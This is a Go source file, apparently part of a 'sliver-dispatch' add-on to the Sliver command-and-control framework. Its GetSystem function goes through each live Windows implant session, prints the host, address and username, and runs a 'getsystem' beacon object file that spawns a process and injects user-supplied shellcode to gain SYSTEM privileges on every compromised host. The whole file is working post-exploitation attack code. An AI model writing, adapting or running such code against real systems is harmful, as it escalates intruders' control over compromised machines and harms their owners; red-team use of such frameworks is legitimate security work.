package dispatch

import (
	"context"
	"fmt"
	"sliver-dispatch/utils"
	"strings"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/rpcpb"
)

func GetSystem(rpc rpcpb.SliverRPCClient, args ...string) {

	if len(args) < 2 {
		fmt.Println("Need the full path to shellcode and process name to spawn to (as system).")
		return
	}

	path_shc := args[0]
	processName := args[1]

	var sessions *clientpb.Sessions
	var err error
	sessions, err = rpc.GetSessions(context.Background(), &commonpb.Empty{})
	if err != nil {
		utils.Eprint("Error listing sessions: %s", err.Error())
	}

	var session *clientpb.Session
	for _, session = range sessions.GetSessions() {
		if !session.IsDead && session.OS == "windows" {

			utils.Iprint(fmt.Sprintf("==| ID: %-10s | Host: %-20s | Address: %-15s | Username: %-10s |==",
				strings.Split(session.ID, "-")[0],
				session.Hostname,
				strings.Split(session.RemoteAddress, ":")[0],
				session.Username))

			status := utils.BofExec("getsystem", []string{processName, path_shc}, session, rpc)
			if status == utils.BOF_ERR_OTHER {
				return
			}

		}
	}
}
